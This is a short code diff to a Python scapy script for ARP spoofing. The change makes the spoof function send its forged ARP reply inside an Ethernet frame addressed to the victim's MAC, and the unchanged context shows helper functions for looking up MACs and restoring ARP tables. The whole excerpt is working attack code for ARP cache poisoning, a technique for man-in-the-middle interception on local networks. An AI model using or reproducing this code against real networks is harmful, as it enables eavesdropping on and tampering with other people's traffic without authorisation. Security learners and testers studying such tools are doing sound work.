@@ -37,7 +37,8 @@ def get_mac(ip: str) -> str:
 def spoof(target_ip: str, spoof_ip: str) -> None:
     target_mac = get_mac(target_ip)
     spoof_packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
-    scapy.send(spoof_packet, verbose = False)
+    ether_frame = scapy.Ether(dst = target_mac) / spoof_packet
+    scapy.sendp(ether_frame, verbose = False)
     
 def restore(source_ip: str, destination_ip: str) -> None:
     source_mac = get_mac(source_ip)
